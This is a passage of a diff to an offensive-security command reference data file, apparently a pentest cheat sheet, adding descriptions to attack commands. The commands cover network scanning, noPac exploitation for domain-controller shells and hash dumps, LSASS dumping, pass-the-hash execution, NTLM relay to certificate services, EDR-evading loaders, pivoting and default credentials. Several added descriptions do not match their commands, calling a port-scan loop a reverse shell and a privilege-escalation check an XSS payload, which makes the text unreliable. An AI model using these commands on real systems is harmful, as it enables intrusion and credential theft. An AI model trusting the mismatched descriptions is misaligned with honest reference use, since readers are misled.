+          "command": "sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20 | grep for | cut -d\" \" -f5",
+          "description": "Performs a host discovery sweep (ping scan) without port scanning. Quickly identifies live hosts on the network for further enumeration."
         },
         {
           "label": "IP range shorthand",
-          "command": "sudo nmap -sn -oA tnet 10.129.2.18-20 | grep for | cut -d\" \" -f5"
+          "command": "sudo nmap -sn -oA tnet 10.129.2.18-20 | grep for | cut -d\" \" -f5",
+          "description": "Performs a host discovery sweep (ping scan) without port scanning. Quickly identifies live hosts on the network for further enumeration."
         }
       ],
       "lint_ignore": [
@@ -96986,15 +97568,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "No retries (fastest, least reliable)",
-          "command": "sudo nmap <cidr> -F --max-retries 0"
+          "command": "sudo nmap <cidr> -F --max-retries 0",
+          "description": "No retries (fastest, least reliable). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Minimum packet rate",
-          "command": "sudo nmap <cidr> -F --min-rate 300"
+          "command": "sudo nmap <cidr> -F --min-rate 300",
+          "description": "Scans target ports and services using nmap for network reconnaissance and vulnerability discovery."
         },
         {
           "label": "Insane timing template",
-          "command": "sudo nmap <cidr> -F -T 5"
+          "command": "sudo nmap <cidr> -F -T 5",
+          "description": "Scans target ports and services using nmap for network reconnaissance and vulnerability discovery."
         }
       ],
       "opsec": "moderate",
@@ -97200,27 +97785,32 @@ const COMMAND_DATA = {
         {
           "command": "nmap -v -sn <cidr> -oG ping-sweep.txt",
           "caption": "Ping sweep of subnet, greppable output",
-          "label": "nmap -v -sn -oG"
+          "label": "nmap -v -sn -oG",
+          "description": "Performs a host discovery sweep (ping scan) without port scanning. Quickly identifies live hosts on the network for further enumeration."
         },
         {
           "command": "nmap -p 80 <cidr> -oG web-sweep.txt",
           "caption": "Web host discovery sweep, greppable",
-          "label": "nmap -p 80 -oG"
+          "label": "nmap -p 80 -oG",
+          "description": "Scans target ports and services using nmap for network reconnaissance and vulnerability discovery."
         },
         {
           "command": "nmap -sT -A --top-ports=20 <cidr> -oG top-port-sweep.txt",
           "caption": "Top-20 port sweep across subnet, greppable",
-          "label": "nmap -sT -A --top-ports=20"
+          "label": "nmap -sT -A --top-ports=20",
+          "description": "Runs an nmap scan with TCP connect scan, aggressive mode (OS detection, versions, scripts, traceroute), top 20 ports for detailed service enumeration and target analysis."
         },
         {
           "command": "grep 'Up' ping-sweep.txt | cut -d ' ' -f 2",
           "caption": "Parse greppable ping sweep for live hosts",
-          "label": "Extract live hosts"
+          "label": "Extract live hosts",
+          "description": "Parses nmap ping sweep output to extract just the IP addresses of live hosts. Filters the text output to create a clean target list for further scanning."
         },
         {
           "command": "grep 'open' web-sweep.txt | cut -d ' ' -f 2",
           "caption": "Parse greppable port sweep for hosts with port open",
-          "label": "Extract open-port hosts"
+          "label": "Extract open-port hosts",
+          "description": "Parses nmap port scan output to extract IPs with open ports. Creates a filtered target list of hosts running the specific service."
         }
       ],
       "defense": {
@@ -97526,7 +98116,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "DC-focused ports only",
-          "command": "nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV <dc_ip>"
+          "command": "nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV <dc_ip>",
+          "description": "Runs an nmap scan with version detection for detailed service enumeration and target analysis."
         }
       ],
       "explain": "Runs a full nmap scan against a discovered host list:\n  sudo nmap -v   verbose\n  -A            OS detection, version detection, default scripts, and traceroute\n  -iL <hostfile>   read targets from the fping output file\n  -oN <outfile>    save normal-format results\nProfiles services across all live hosts so you can pick attack surface; narrow with -p and --open for a faster targeted sweep."
@@ -97622,19 +98213,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Quick default scan",
-          "command": "nmap <ip>"
+          "command": "nmap <ip>",
+          "description": "Scans target ports and services using nmap for network reconnaissance and vulnerability discovery."
         },
         {
           "label": "Named script on a port",
-          "command": "nmap --script <script> -p<port> <ip>"
+          "command": "nmap --script <script> -p<port> <ip>",
+          "description": "Runs an nmap scan with default scripts for detailed service enumeration and target analysis."
         },
         {
           "label": "Banner-grab script",
-          "command": "nmap -sV --script=banner <ip>"
+          "command": "nmap -sV --script=banner <ip>",
+          "description": "Grabs service banners using nmap NSE scripts. Banners reveal software versions and sometimes internal hostnames or OS details."
         },
         {
           "label": "Aggressive SMB",
-          "command": "nmap -A -p445 <ip>"
+          "command": "nmap -A -p445 <ip>",
+          "description": "Runs an nmap scan with aggressive mode (OS detection, versions, scripts, traceroute) for detailed service enumeration and target analysis."
         }
       ],
       "opsec": "moderate",
@@ -98347,7 +98942,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Packet-trace on a single port (diagnose closed/filtered state)",
-          "command": "sudo nmap <ip> -p 21 --packet-trace -Pn -n --disable-arp-ping"
+          "command": "sudo nmap <ip> -p 21 --packet-trace -Pn -n --disable-arp-ping",
+          "description": "Runs an nmap scan with aggressive mode (OS detection, versions, scripts, traceroute), packet trace/reason diagnostics for detailed service enumeration and target analysis."
         }
       ],
       "explain": "Completes the full TCP handshake to determine port state:\n  -sT     TCP connect scan (works without root and through proxies)\n  -p 443  the port\n  -Pn -n --disable-arp-ping   no discovery/DNS/ARP\n  --packet-trace              show the packets\n  --reason                    print why Nmap calls a port open/closed/filtered\nUse -sT when you cannot send raw packets (unprivileged, or over a SOCKS proxy)."
@@ -98416,15 +99012,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All 65535 ports",
-          "command": "sudo nmap <ip> -p-"
+          "command": "sudo nmap <ip> -p-",
+          "description": "Runs an nmap scan with all 65535 TCP ports for detailed service enumeration and target analysis."
         },
         {
           "label": "Fast (top 100)",
-          "command": "sudo nmap <ip> -F"
+          "command": "sudo nmap <ip> -F",
+          "description": "Scans target ports and services using nmap for network reconnaissance and vulnerability discovery."
         },
         {
           "label": "Specific ports / range",
-          "command": "sudo nmap <ip> -p 22,25,80,139,445\nsudo nmap <ip> -p 22-445"
+          "command": "sudo nmap <ip> -p 22,25,80,139,445\nsudo nmap <ip> -p 22-445",
+          "description": "Scans target ports and services using nmap for network reconnaissance and vulnerability discovery."
         }
       ],
       "opsec": "moderate",
@@ -99214,19 +99813,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "A whole category",
-          "command": "sudo nmap <target> --script <category>"
+          "command": "sudo nmap <target> --script <category>",
+          "description": "Runs an nmap scan with default scripts for detailed service enumeration and target analysis."
         },
         {
           "label": "Named scripts",
-          "command": "sudo nmap <target> --script <script1>,<script2>"
+          "command": "sudo nmap <target> --script <script1>,<script2>",
+          "description": "Runs an nmap scan with default scripts for detailed service enumeration and target analysis."
         },
         {
           "label": "Aggressive (-A)",
-          "command": "sudo nmap <ip> -p 80 -A"
+          "command": "sudo nmap <ip> -p 80 -A",
+          "description": "Runs an nmap scan with aggressive mode (OS detection, versions, scripts, traceroute) for detailed service enumeration and target analysis."
         },
         {
           "label": "Vuln category",
-          "command": "sudo nmap <ip> -p 80 -sV --script vuln"
+          "command": "sudo nmap <ip> -p 80 -sV --script vuln",
+          "description": "Runs nmap vulnerability detection scripts against the target. Checks for known CVEs and common exploitable misconfigurations."
         }
       ],
       "opsec": "moderate",
@@ -99554,11 +100157,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Dump hashes via noPac",
-          "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -dump"
+          "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -dump",
+          "description": "Exploits the noPac/sAMAccountName spoofing vulnerability (CVE-2021-42278/42287) to impersonate a domain controller and dump password hashes. Chains machine account manipulation with S4U2self for instant domain compromise."
         },
         {
           "label": "Get a shell",
-          "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -shell"
+          "command": "sudo python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_name> --impersonate administrator -shell",
+          "description": "Exploits noPac to obtain an interactive SYSTEM shell on the domain controller. Combines the sAMAccountName spoofing vulnerability (CVE-2021-42278/42287) with service ticket impersonation for remote code execution."
         }
       ],
       "steps": [
@@ -99747,11 +100352,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Exploit -> impersonate DA + shell",
-          "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator"
+          "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator",
+          "description": "Exploit -> impersonate DA + shell. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Exploit -> dump hashes",
-          "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump"
+          "command": "python3 noPac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump",
+          "description": "Exploits the noPac/sAMAccountName spoofing vulnerability (CVE-2021-42278/42287) to impersonate a domain controller and dump password hashes. Chains machine account manipulation with S4U2self for instant domain compromise."
         }
       ],
       "explain": "Checks whether a domain is vulnerable to NoPac (CVE-2021-42278 + CVE-2021-42287) with only LDAP queries:\n  scanner.py <domain>/<user>:<password>   authenticate as any domain user\n  -dc-ip <dc_ip>   the Domain Controller to test\n  -use-ldap        query over LDAP (quiet - no exploitation)\nPrints the domain SID and confirms if the DC can be impersonated; run it before noPac.py so you only fire the exploit against a confirmed-vulnerable DC."
@@ -100356,11 +100963,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Create the LSASS dump on the target (managed minidump)",
-          "command": "powershell -c \"<minidump_script> -pid (Get-Process lsass).Id -output <dump_file>\""
+          "command": "powershell -c \"<minidump_script> -pid (Get-Process lsass).Id -output <dump_file>\"",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Un-reverse / repair a byte-reversed dump",
-          "command": "Reverse.exe \"<dump_file>\" \"<fixed_dump>\""
+          "command": "Reverse.exe \"<dump_file>\" \"<fixed_dump>\"",
+          "description": "Un-reverse / repair a byte-reversed dump. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -101590,7 +102199,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Without sysdba (limited-priv account)",
-          "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --putFile <remote_dir> <remote_filename> <file>"
+          "command": "./odat.py utlfile -s <ip> -d <sid> -U <user> -P <password> --putFile <remote_dir> <remote_filename> <file>",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "steps": [
@@ -102237,11 +102847,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Default creds",
-          "command": "Tomcat:  tomcat/tomcat, admin/admin\nSplunk:  admin/changeme\nPRTG:    prtgadmin/prtgadmin\nWebLogic: system/manager\nNagios:  nagiosadmin/PASSW0RD"
+          "command": "Tomcat:  tomcat/tomcat, admin/admin\nSplunk:  admin/changeme\nPRTG:    prtgadmin/prtgadmin\nWebLogic: system/manager\nNagios:  nagiosadmin/PASSW0RD",
+          "description": "Quick-reference list of default credentials for common enterprise applications. Always test these before brute-forcing - many installations ship with well-known default passwords that are never changed."
         },
         {
           "label": "Deploy / RCE primitive",
-          "command": "Axis2:    AAR webshell upload (or Metasploit)\nWebSphere: WAR deployment\nWebLogic: exploit/multi/http/weblogic_admin_handle_rce\nvCenter:  JuicyPotato local privesc (Windows)"
+          "command": "Axis2:    AAR webshell upload (or Metasploit)\nWebSphere: WAR deployment\nWebLogic: exploit/multi/http/weblogic_admin_handle_rce\nvCenter:  JuicyPotato local privesc (Windows)",
+          "description": "Reference for code deployment and remote code execution methods across application servers. Each platform has a specific deployment mechanism (WAR, AAR, etc.) that can be weaponized for initial access."
         }
       ],
       "opsec": "loud",
@@ -102283,39 +102895,48 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "List OUs",
-          "command": "Get-DomainOU | select -ExpandProperty name"
+          "command": "Get-DomainOU | select -ExpandProperty name",
+          "description": "Uses PowerView to enumerate all Organizational Units in the domain and their properties."
         },
         {
           "label": "Computers inside a specific OU",
-          "command": "(Get-DomainOU -Identity <ou_name>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name"
+          "command": "(Get-DomainOU -Identity <ou_name>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name",
+          "description": "Uses PowerView to enumerate domain-joined computers and their properties for target identification."
         },
         {
           "label": "GPO linked to an OU (resolve gplink)",
-          "command": "Get-DomainGPO -Identity (Get-DomainOU -Identity <ou_name>).gplink.substring(11,(Get-DomainOU -Identity <ou_name>).gplink.length-72)"
+          "command": "Get-DomainGPO -Identity (Get-DomainOU -Identity <ou_name>).gplink.substring(11,(Get-DomainOU -Identity <ou_name>).gplink.length-72)",
+          "description": "Uses PowerView to enumerate Organizational Units and their linked GPOs. Identifies which policies apply to which OUs - a GPO linked to an OU with privileged users or servers is a high-value target."
         },
         {
           "label": "GPO by friendly name",
-          "command": "Get-DomainGPO -Identity '<gpo_display_name>'"
+          "command": "Get-DomainGPO -Identity '<gpo_display_name>'",
+          "description": "Uses PowerView to enumerate Group Policy Objects and their settings for identifying misconfigurations and attack vectors."
         },
         {
           "label": "GPO-granted local admin (Restricted Groups)",
-          "command": "Get-DomainGPOLocalGroup"
+          "command": "Get-DomainGPOLocalGroup",
+          "description": "Uses PowerView to enumerate Group Policy Objects and their settings for identifying misconfigurations and attack vectors."
         },
         {
           "label": "Where a user/group is local admin via GPO",
-          "command": "Get-DomainGPOUserLocalGroupMapping -Identity <user> -Verbose"
+          "command": "Get-DomainGPOUserLocalGroupMapping -Identity <user> -Verbose",
+          "description": "Uses PowerView to enumerate Group Policy Objects and their settings for identifying misconfigurations and attack vectors."
         },
         {
           "label": "gpresult /r - applied GPOs on this host",
-          "command": "gpresult /r"
+          "command": "gpresult /r",
+          "description": "Gpresult /r - applied GPOs on this host. See the command syntax for exact parameters and flags."
         },
         {
           "label": "gpresult /z - verbose applied GPOs",
-          "command": "gpresult /z"
+          "command": "gpresult /z",
+          "description": "Gpresult /z - verbose applied GPOs. See the command syntax for exact parameters and flags."
         },
         {
           "label": "PowerView OU (course alias of Get-DomainOU)",
-          "command": "Get-NetOU -FullData | select name,distinguishedname"
+          "command": "Get-NetOU -FullData | select name,distinguishedname",
+          "description": "PowerView OU (course alias of Get-DomainOU). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -102764,7 +103385,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "runas /netonly (inject creds into a new logon session)",
-          "command": "runas /user:<domain>\\<user> /netonly cmd"
+          "command": "runas /user:<domain>\\<user> /netonly cmd",
+          "description": "Runas /netonly (inject creds into a new logon session). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Turns an NTLM hash into a real Kerberos TGT (overpass-the-hash) for Kerberos lateral movement:\n  asktgt                    request a TGT from the KDC\n  /user:<user>             the account to authenticate as\n  /rc4:<nt_hash>           its NTLM hash used as the Kerberos key (use /aes256 for opsec)\n  /domain:<domain>         the domain\n  /ptt                      inject the ticket into the current session\n  /opsec                    mimic a genuine client's request flags\nWith the TGT injected you access services (dir \\\\<dc>\\C$) as that user without ever knowing the plaintext."
@@ -102848,42 +103470,50 @@ const COMMAND_DATA = {
         {
           "command": "smbclient \\\\\\\\<target>\\\\ADMIN$ -U Administrator --pw-nt-hash <nt_hash>",
           "caption": "Connect to ADMIN$ share as local Administrator",
-          "label": "smbclient \\\\\\\\<target>\\\\ADMIN$ -U …"
+          "label": "smbclient \\\\\\\\<target>\\\\ADMIN$ -U …",
+          "description": "Smbclient \\\\\\\\<target>\\\\ADMIN$ -U …. See the command syntax for exact parameters and flags."
         },
         {
           "command": "smbclient \\\\\\\\<target>\\\\<share> -U <domain>/<user> --pw-nt-hash <nt_hash> -c 'ls'",
           "caption": "Non-interactive: list share contents",
-          "label": "smbclient (hash) - list"
+          "label": "smbclient (hash) - list",
+          "description": "Executes an SMB command non-interactively. Useful for scripting file downloads/uploads or share access checks in automated workflows."
         },
         {
           "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'get <file>'",
           "caption": "Download a specific file",
-          "label": "smbclient (hash) - download"
+          "label": "smbclient (hash) - download",
+          "description": "Smbclient (hash) - download. See the command syntax for exact parameters and flags."
         },
         {
           "command": "smbclient \\\\\\\\<target>\\\\<share> -U <user> --pw-nt-hash <nt_hash> -c 'put <local_file> <remote_file>'",
           "caption": "Upload a file to the share",
-          "label": "smbclient (hash) - upload"
+          "label": "smbclient (hash) - upload",
+          "description": "Connects to an SMB share for interactive file transfer. Supports uploading payloads and downloading sensitive files from accessible shares."
         },
         {
           "command": "impacket-psexec -hashes :<nt_hash> <user>@<target>",
           "caption": "PTH with impacket-psexec for code execution (SYSTEM shell)",
-          "label": "impacket-psexec"
+          "label": "impacket-psexec",
+          "description": "Uses Impacket psexec with pass-the-hash authentication - authenticates using an NTLM hash instead of a password. Provides SYSTEM-level shell access without knowing the plaintext password."
         },
         {
           "command": "impacket-wmiexec -hashes :<nt_hash> <user>@<target>",
           "caption": "PTH with WMI execution (less noisy than psexec)",
-          "label": "impacket-wmiexec"
+          "label": "impacket-wmiexec",
+          "description": "Uses Impacket wmiexec for semi-interactive shell access via Windows Management Instrumentation (WMI). Executes commands through the DCOM/WMI service - more stealthy than PsExec as it does not write a service binary to disk."
         },
         {
           "command": "crackmapexec smb <target> -u <user> -H <nt_hash> --shares",
           "caption": "CrackMapExec PTH: enumerate all accessible shares",
-          "label": "cme (hash) - enum shares"
+          "label": "cme (hash) - enum shares",
+          "description": "Uses CrackMapExec to enumerate accessible SMB shares on target hosts. Lists shares and your permission level (READ/WRITE) - identifies data access and potential write targets for payload deployment."
         },
         {
           "command": "crackmapexec smb <cidr> -u <user> -H <nt_hash> -x 'whoami'",
           "caption": "CrackMapExec PTH: spray hash across subnet and run command",
-          "label": "cme (hash) - exec on CIDR"
+          "label": "cme (hash) - exec on CIDR",
+          "description": "Uses CrackMapExec to execute a command on the target via SMB (cmd.exe). Remote command execution with the output returned - useful for quick checks across multiple hosts."
         }
       ],
       "examples": [
@@ -103421,7 +104051,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Live capture from an interface",
-          "command": "sudo ./Pcredz -i <interface> -v"
+          "command": "sudo ./Pcredz -i <interface> -v",
+          "description": "Live capture from an interface. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Extracts credentials from a packet capture:\n  ./Pcredz                 the parser\n  -f <pcap_file>           read this capture file (use -i <interface> for live capture)\n  -t                       parse credentials from the file\n  -v                       verbose output\nPulls HTTP basic/NTLM, FTP, SMTP/POP/IMAP logins, SNMP strings, and NTLMv1/v2 and Kerberos hashes - hunt cleartext protocols first, and crack any captured NetNTLM offline."
@@ -103702,7 +104333,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Coerce to an ADCS relay (ESC8)",
-          "command": "sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+          "command": "sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+          "description": "Relays captured NTLM authentication to other services. Instead of cracking captured hashes, forwards the authentication to a target machine for immediate access - no password cracking needed."
         }
       ],
       "steps": [
@@ -104855,11 +105487,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Scanner options available via interactive TUI",
-          "command": "# 1-aclcheck  2-antivirus  3-computerversion  4-foreignusers\n# 5-laps_bitlocker  6-localadmin  7-nullsession  8-nullsession-trust\n# 9-oxidbindings  a-remote  b-share  c-smb  d-smb3querynetwork\n# e-spooler  f-startup  g-zerologon"
+          "command": "# 1-aclcheck  2-antivirus  3-computerversion  4-foreignusers\n# 5-laps_bitlocker  6-localadmin  7-nullsession  8-nullsession-trust\n# 9-oxidbindings  a-remote  b-share  c-smb  d-smb3querynetwork\n# e-spooler  f-startup  g-zerologon",
+          "description": "Scanner options available via interactive TUI. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Export users or computers",
-          "command": "PingCastle.exe --export"
+          "command": "PingCastle.exe --export",
+          "description": "Runs PingCastle for automated Active Directory security assessment. Generates a health score and identifies misconfigurations, dangerous trust relationships, and vulnerable settings."
         }
       ],
       "notes": "PingCastle produces an HTML report with risk scores across four categories: Stale Objects, Privileged Accounts, Trust Relationships, and Anomalies. Each category gets a 0-100 score (lower is better). The scanner modes provide targeted checks useful during both attack and reporting phases. The localadmin scanner enumerates which accounts have local admin on machines. The spooler scanner identifies hosts with Print Spooler enabled (PrintNightmare/Printer Bug targets). The zerologon scanner tests for CVE-2020-1472 susceptibility. Requires only a domain-joined host and any domain user credential. Reports can be aggregated across multiple domains with --conso for enterprise-wide assessments.",
@@ -105098,15 +105732,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Windows CMD",
-          "command": "for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\""
+          "command": "for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"",
+          "description": "Bash loop that pings a range of IP addresses for host discovery. Simple alternative to nmap -sn when specialized tools are unavailable."
         },
         {
           "label": "PowerShell",
-          "command": "1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)\"}"
+          "command": "1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)\"}",
+          "description": "PowerShell one-liner that pings all 254 addresses in a /24 subnet. Quick host discovery from a Windows foothold when nmap is not available."
         },
         {
           "label": "Meterpreter",
-          "command": "run post/multi/gather/ping_sweep RHOSTS=<cidr>"
+          "command": "run post/multi/gather/ping_sweep RHOSTS=<cidr>",
+          "description": "Runs a Metasploit post-exploitation module on an active session. Post modules automate common tasks like credential dumping, pivoting, and persistence."
         }
       ],
       "recommended": [
@@ -105281,15 +105918,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Add a portproxy on the jump host (remote via winrs)",
-          "command": "winrs -r:<jump_host> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>"
+          "command": "winrs -r:<jump_host> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker_ip>",
+          "description": "Add a portproxy on the jump host (remote via winrs). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Fetch + run a tool through the proxy on the deep host",
-          "command": "winrs -r:<deep_host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe \"<args>\" \"exit\""
+          "command": "winrs -r:<deep_host> C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/<tool>.exe \"<args>\" \"exit\"",
+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         },
         {
           "label": "Stage the loader to the deep host first",
-          "command": "echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\<deep_host>\\C$\\Users\\Public\\Loader.exe /Y"
+          "command": "echo F | xcopy C:\\AD\\Tools\\Loader.exe \\\\<deep_host>\\C$\\Users\\Public\\Loader.exe /Y",
+          "description": "Stage the loader to the deep host first. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -106201,7 +106841,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "From PEM",
-          "command": "python3 gettgtpkinit.py -cert-pem <cert_pem> -key-pem <key_pem> <domain>/<user> tgt.ccache"
+          "command": "python3 gettgtpkinit.py -cert-pem <cert_pem> -key-pem <key_pem> <domain>/<user> tgt.ccache",
+          "description": "Uses Impacket getTGT to request a Kerberos Ticket Granting Ticket (TGT) from the domain controller. Authenticates with a password, hash, or AES key and saves the TGT to a ccache file for use with other tools."
         }
       ],
       "steps": [
@@ -106420,7 +107061,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Reverse via plink -R",
-          "command": "plink -ssh -R <rport>:<int_target>:<int_port> <user>@<attacker>"
+          "command": "plink -ssh -R <rport>:<int_target>:<int_port> <user>@<attacker>",
+          "description": "Creates an SSH tunnel using PuTTY's plink command-line tool. Windows-native SSH tunneling for port forwarding and pivoting when OpenSSH is not available."
         }
       ],
       "explain": "PuTTY's command-line SSH client for a Windows foothold, opening a SOCKS proxy:\n  -ssh              use the SSH protocol\n  -D <socks_port>   dynamic forward - a local SOCKS proxy over the SSH tunnel\n  <user>@<pivot>    SSH credentials for the pivot\nGives you a SOCKS proxy on Windows; point Proxifier at it to force apps like mstsc.exe through to internal targets."
@@ -106938,7 +107580,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Scan a specific host list",
-          "command": "Invoke-HuntSMBShares -Threads 100 -HostList C:\\hosts.txt -OutputDirectory C:\\Users\\Public"
+          "command": "Invoke-HuntSMBShares -Threads 100 -HostList C:\\hosts.txt -OutputDirectory C:\\Users\\Public",
+          "description": "Crawls SMB shares across the domain looking for accessible files with sensitive content. Scans for credentials in configs, scripts, and documents - outputs a structured report of findings."
         }
       ],
       "explain": "Inventories domain SMB shares and flags dangerous access, from a domain-joined host:\n  Invoke-HuntSMBShares     discover shares and score their permissions\n  -Threads 100             parallelism for speed\n  -OutputDirectory C:\\Users\\Public   where to write the HTML/CSV report\nHighlights shares readable/writable by low-priv users - where sensitive files and credentials leak; -HostList scopes it to specific hosts."
@@ -107157,11 +107800,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Custom range",
-          "command": "<port_start>..<port_end> | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"<ip>\", $_)) \"TCP port $_ is open\"} 2>$null"
+          "command": "<port_start>..<port_end> | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"<ip>\", $_)) \"TCP port $_ is open\"} 2>$null",
+          "description": "PowerShell reverse shell one-liner. Target connects back to your listener - works through NAT and most egress firewalls if the port is allowed."
         },
         {
           "label": "Store open ports in variable",
-          "command": "$open = 1..1024 | ? {try{(New-Object Net.Sockets.TcpClient).Connect(\"<ip>\",$_);$true}catch{$false}}; $open"
+          "command": "$open = 1..1024 | ? {try{(New-Object Net.Sockets.TcpClient).Connect(\"<ip>\",$_);$true}catch{$false}}; $open",
+          "description": "PowerShell reverse shell one-liner. Target connects back to your listener - works through NAT and most egress firewalls if the port is allowed."
         }
       ],
       "examples": [
@@ -107260,11 +107905,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Alias (shorter)",
-          "command": "tnc <ip> -Port <port>"
+          "command": "tnc <ip> -Port <port>",
+          "description": "Tests TCP connectivity to a specific host and port from PowerShell. Built-in alternative to nmap for checking if a service is reachable when specialized tools are unavailable."
         },
         {
           "label": "With verbose output",
-          "command": "Test-NetConnection -Port <port> <ip> -InformationLevel Detailed"
+          "command": "Test-NetConnection -Port <port> <ip> -InformationLevel Detailed",
+          "description": "Tests TCP connectivity to a specific host and port from PowerShell. Built-in alternative to nmap for checking if a service is reachable when specialized tools are unavailable."
         }
       ],
       "examples": [
@@ -107880,15 +108527,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "winPEAS in-memory via Loader",
-          "command": "Loader.exe -Path <winpeas_exe> -args notcolor log"
+          "command": "Loader.exe -Path <winpeas_exe> -args notcolor log",
+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         },
         {
           "label": "PrivEscCheck",
-          "command": ". <script_ps1>; Invoke-PrivescCheck"
+          "command": ". <script_ps1>; Invoke-PrivescCheck",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "Service abuse (writable service)",
-          "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>' -Verbose"
+          "command": "Invoke-ServiceAbuse -Name '<service>' -UserName '<domain>\\<user>' -Verbose",
+          "description": "Service abuse (writable service). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Runs every PowerUp check to find Windows local privilege-escalation vectors:\n  Invoke-AllChecks          scan for unquoted service paths, weak service/file permissions, AlwaysInstallElevated, autologon creds, DLL hijacks, etc.\nDot-source PowerUp.ps1 first. Each finding maps to an abuse function - e.g. Invoke-ServiceAbuse -Name <service> -UserName <domain>\\<user> hijacks a writable service to add you to a group."
@@ -108097,11 +108747,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Audit for privesc",
-          "command": "Invoke-SQLAudit -Verbose"
+          "command": "Invoke-SQLAudit -Verbose",
+          "description": "Runs automated security auditing on SQL Server instances using PowerUpSQL. Checks for dangerous configurations like xp_cmdshell, excessive permissions, and stored credentials."
         },
         {
           "label": "Crawl links + run OS command",
-          "command": "Get-SQLServerLinkCrawl -Instance <instance> -Query 'exec master..xp_cmdshell ''whoami'''"
+          "command": "Get-SQLServerLinkCrawl -Instance <instance> -Query 'exec master..xp_cmdshell ''whoami'''",
+          "description": "Crawl links + run OS command. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -108309,11 +108961,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "net rpc (Linux)",
-          "command": "net rpc password <target_user> -U <domain>/<user>%<password> -S <dc_ip>"
